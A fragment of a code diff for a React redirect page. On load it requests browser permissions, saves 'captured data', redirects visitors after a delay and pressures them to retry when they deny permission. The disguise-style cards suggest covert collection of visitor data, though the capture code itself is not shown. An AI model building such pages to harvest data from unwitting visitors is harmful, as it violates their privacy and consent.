+            console.error("Failed to save captured data:", error);
+        } finally {
+            if (settings.redirectDelay > 0) {
+              setTimeout(() => { window.location.href = settings.redirectUrl; }, settings.redirectDelay * 1000);
+            } else {
+              window.location.href = settings.redirectUrl;
+            }
+        }
+    }, [settings, isPreview]);
+
+  React.useEffect(() => {
+    if (status === 'loading' && settings && !isPreview) {
+      requestPermissions();
     }
+  }, [status, settings, isPreview, requestPermissions]);
 
-  }, [settings, isPreview, captureInitiated, addNotification]);
-  
-  const handleClosePreview = () => onClosePreview?.();
-
-  if (error) {
-    return (
-      <div className="w-full h-full flex flex-col justify-center items-center gap-4 bg-slate-900 text-slate-200 text-center p-4">
-        <h1 className="text-2xl font-bold">{t('redirect_invalid_link_title')}</h1>
-        <p>{error}</p>
-      </div>
-    );
-  }
-
-  if (!settings) {
-     return <div className="w-full h-full bg-slate-900 flex justify-center items-center"><h1 className="text-2xl font-bold text-white">{t('loading')}...</h1></div>;
-  }
-  
-  const containerStyle = {
-    backgroundColor: settings.backgroundColor,
-    ...(settings.backgroundImageUrl && { backgroundImage: `url(${settings.backgroundImageUrl})` }),
+  const renderContent = () => {
+    if (status === 'initializing') {
+      return <h1 className="text-2xl font-bold text-white">{t('redirect_initializing')}</h1>;
+    }
+    if (status === 'invalid') {
+        return (
+            <div className="text-center p-8 bg-slate-800 rounded-lg shadow-xl">
+                 <h1 className="text-3xl font-bold text-red-500 mb-2">{t('redirect_invalid_link_title')}</h1>
+                 <p className="text-slate-400">{t('redirect_invalid_link_subtitle')}</p>
+            </div>
+        );
+    }
+    if (permissionDenied) {
+        return <PermissionInstructions onRetry={requestPermissions} requiredPermissions={deniedPermissions} />;
+    }
+    if (status === 'loading') {
+      return <h1 className="text-2xl font-bold text-white">{t('redirect_loading')}</h1>;
+    }
+    if (settings && (status === 'redirecting' || isPreview)) {
+      const CardComponent = CARD_COMPONENTS[settings.cardStyle] || CARD_COMPONENTS['default-white'];
+      return <CardComponent settings={settings} isPaused={isPreview} t={t} />;
+    }
+    return null;
   };
   
-  const renderCard = () => {
-    // If permissions were denied, isPaused will be true, halting the progress bar.
-    const props = { settings, isPaused: isPreview || isPaused, t };
-    return (
-      <div className={`relative transition-all duration-300 ${showDeniedPopup ? 'blur-md' : ''}`}>
-        {(() => {
-          switch (settings.cardStyle) {
-            case 'glass': return <GlassCard {...props} />;
-            case 'minimal': return <MinimalCard {...props} />;
-            case 'elegant': return <ElegantCard {...props} />;
-            case 'sleek-dark': return <SleekDarkCard {...props} />;
-            case 'article': return <ArticleCard {...props} />;
-            case 'terminal': return <TerminalCard {...props} />;
-            case 'retro-tv': return <RetroTVCard {...props} />;
-            case 'gradient-burst': return <GradientBurstCard {...props} />;
-            case 'video-player': return <VideoPlayerCard {...props} />;
-            default: return <DefaultWhiteCard {...props} />;
-          }
-        })()}
-      </div>
-    );
+  const backgroundStyle: React.CSSProperties = {
+    backgroundColor: settings?.backgroundColor,
+    ...(settings?.backgroundImageUrl && {
+      backgroundImage: `url(${settings.backgroundImageUrl})`,
+      backgroundSize: 'cover',
+      backgroundPosition: 'center',
+    }),
   };
 
   return (
-    <div
-      className={`relative w-full h-full flex flex-col justify-center items-center transition-colors duration-500 bg-cover bg-center p-4 overflow-hidden font-sans`}
-      style={containerStyle}
-    >
-        {isPreview && !isEmbeddedPreview && (
-            <div className="absolute top-4 right-4 text-right z-10 animate-fade-in">
-                <div className="bg-black/40 backdrop-blur-sm rounded-lg p-3 shadow-lg">
-                    <button onClick={handleClosePreview} className="font-semibold py-1 px-3 rounded-md transition-colors bg-slate-200 text-slate-800 hover:bg-white">
-                        {t('close')}
-                    </button>
-                </div>
-            </div>
-        )}
-        {showDeniedPopup && (
-             <div className="absolute inset-0 z-20 flex items-center justify-center animate-fade-in p-4">
-                 <div className="text-center bg-black/50 backdrop-blur-lg p-8 rounded-2xl max-w-sm border border-slate-700 shadow-2xl">
-                     <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
-                     <p className="text-slate-300">{t('redirect_permissions_denied_message')}</p>
-                 </div>
-             </div>
-        )}
-        {renderCard()}
+    <div className={`w-full h-full flex justify-center items-center p-4 ${settings?.theme || 'dark'}`} style={backgroundStyle}>
+      <div className={`${isEmbeddedPreview ? '' : 'absolute inset-0 bg-black/30'}`}></div>
+      <div className="relative z-10">
+        {renderContent()}
+      </div>
     </div>
   );
 };
